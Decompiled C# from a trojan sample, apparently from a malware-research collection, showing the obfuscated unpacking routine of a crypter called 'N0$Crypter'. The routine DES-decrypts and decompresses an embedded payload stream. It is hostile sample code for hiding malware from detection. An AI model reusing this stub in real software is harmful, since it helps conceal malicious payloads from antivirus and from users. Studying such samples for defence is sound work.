// Decompiled with JetBrains decompiler
// Type: A.DC
// Assembly: N0$Crypter, Version=3.0.7.1, Culture=neutral, PublicKeyToken=null
// MVID: FD276B3A-BCAA-4176-AE7A-13B114112E73
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.hae-91602cc2011b8768f677252d0fce055cd9e20323cd9c86736de5f27b67249290.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace A
{
  internal sealed class DC
  {
    private static MemoryStream A;
    private static MemoryStream B;
    private static object A;
    private static int A = int.MaxValue;
    private static int B = int.MinValue;

    static DC()
    {
      DC.A = (MemoryStream) null;
      DC.B = (MemoryStream) null;
      DC.A = TT.A();
    }

    private static string A(Assembly _param0)
    {
      string str = ADB.A((object) _param0);
      int num = ZCB.A((object) str, ',');
      if (num >= 0)
      {
label_1:
        switch (4)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DC.A);
            }
            str = CL.A((object) str, 0, num);
            break;
        }
      }
      return str;
    }

    private static byte[] A(Assembly _param0)
    {
      try
      {
        string str = ADB.A((object) _param0);
        int num1 = EDB.A((object) str, "PublicKeyToken=");
        if (num1 < 0)
        {
label_1:
          switch (7)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (DC.A);
              }
              num1 = EDB.A((object) str, "publickeytoken=");
              break;
          }
        }
        if (num1 < 0)
        {
label_6:
          switch (3)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (FL.A((object) str, num2) != 'n')
          {
label_9:
            switch (1)
            {
              case 0:
                goto label_9;
              default:
                if (FL.A((object) str, num2) == 'N')
                {
label_11:
                  switch (3)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] numArray = CDB.A(DDB.A(CL.A((object) str, num2, 16), NumberStyles.HexNumber));
                  BDB.A((Array) numArray);
                  return numArray;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] A(Stream _param0)
    {
      object a;
      BU.A(a = DC.A);
      try
      {
        Stream stream = _param0;
        MemoryStream memoryStream = (MemoryStream) null;
        byte num1 = (byte) NDB.A((object) _param0);
        if (((int) num1 & 1) != 0)
        {
label_2:
          switch (7)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (DC.A);
              }
              DESCryptoServiceProvider cryptoServiceProvider = MDB.A();
              byte[] numArray1 = new byte[8];
              OV.A((object) _param0, numArray1, 0, 8);
              DJ.A((object) cryptoServiceProvider, numArray1);
              byte[] numArray2 = new byte[8];
              OV.A((object) _param0, numArray2, 0, 8);
              bool flag = true;
              foreach (byte num2 in numArray2)
              {
                if (num2 != (byte) 0)
                {
label_7:
                  switch (2)
                  {
                    case 0:
                      goto label_7;
                    default:
                      flag = false;
                      goto label_12;
                  }
                }
              }
label_11:
              switch (6)
              {
                case 0:
                  goto label_11;
              }
label_12:
              if (flag)
              {
label_13:
                switch (3)
                {
                  case 0:
                    goto label_13;
                  default:
                    numArray2 = DC.A(QI.A());
                    break;
                }
              }
              EJ.A((object) cryptoServiceProvider, numArray2);
              if (DC.A == null)
              {
label_16:
                switch (2)
                {
                  case 0:
                    goto label_16;
                  default:
                    if (DC.A == int.MaxValue)
                    {
label_18:
                      switch (3)
                      {
                        case 0:
                          goto label_18;
                        default:
                          DC.A = CAB.A((int) GDB.A((object) _param0));
                          break;
                      }
                    }
                    else
                    {
                      DC.A = CAB.A(DC.A);
                      break;
                    }
                    break;
                }
              }
              IDB.A((object) DC.A, 0L);
              ICryptoTransform cryptoTransform = LK.A((object) cryptoServiceProvider);
              int num3 = KDB.A((object) cryptoTransform);
              LDB.A((object) cryptoTransform);
              byte[] numArray3 = new byte[LDB.A((object) cryptoTransform)];
              byte[] numArray4 = new byte[KDB.A((object) cryptoTransform)];
              int num4;
              for (num4 = (int) FDB.A((object) _param0); (long) (num4 + num3) < GDB.A((object) _param0); num4 += num3)
              {
                OV.A((object) _param0, numArray4, 0, num3);
                int num5 = JDB.A((object) cryptoTransform, numArray4, 0, num3, numArray3, 0);
                QV.A((object) DC.A, numArray3, 0, num5);
              }
label_24:
              switch (2)
              {
                case 0:
                  goto label_24;
                default:
                  OV.A((object) _param0, numArray4, 0, (int) (GDB.A((object) _param0) - (long) num4));
                  byte[] numArray5 = BJ.A((object) cryptoTransform, numArray4, 0, (int) (GDB.A((object) _param0) - (long) num4));
                  QV.A((object) DC.A, numArray5, 0, numArray5.Length);
                  stream = (Stream) DC.A;
                  IDB.A((object) stream, 0L);
                  memoryStream = DC.A;
                  break;
              }
              break;
          }
        }
        if (((int) num1 & 2) != 0)
        {
label_27:
          switch (7)
          {
            case 0:
              goto label_27;
            default:
              try
              {
                if (DC.B == null)
                {
label_29:
                  switch (3)
                  {
                    case 0:
                      goto label_29;
                    default:
                      if (DC.B == int.MinValue)
                      {
label_31:
                        switch (1)
                        {
                          case 0:
                            goto label_31;
                          default:
                            DC.B = CAB.A((int) GDB.A((object) stream) * 2);
                            break;
                        }
                      }
                      else
                      {
                        DC.B = CAB.A(DC.B);
                        break;
                      }
                      break;
                  }
                }
                IDB.A((object) DC.B, 0L);
                DeflateStream deflateStream = HDB.A(stream, CompressionMode.Decompress);
                int length = 1000;
                byte[] numArray = new byte[length];
                int num6;
                do
                {
                  num6 = OV.A((object) deflateStream, numArray, 0, length);
                  if (num6 > 0)
                  {
label_36:
                    switch (2)
                    {
                      case 0:
                        goto label_36;
                      default:
                        QV.A((object) DC.B, numArray, 0, num6);
                        break;
                    }
                  }
                }
                while (num6 >= length);
label_39:
                switch (7)
                {
                  case 0:
                    goto label_39;
                  default:
                    memoryStream = DC.B;
                    break;
                }
              }
              catch (Exception ex)
              {
                break;
              }
              break;
          }
        }
        if (memoryStream != null)
        {
label_43:
          switch (4)
          {
            case 0:
              goto label_43;
            default:
              return KQ.A((object) memoryStream);
          }
        }
        else
        {
          byte[] numArray = new byte[GDB.A((object) _param0) - FDB.A((object) _param0)];
          OV.A((object) _param0, numArray, 0, numArray.Length);
          return numArray;
        }
      }
      finally
      {
        ZT.A(a);
      }
    }
  }
}
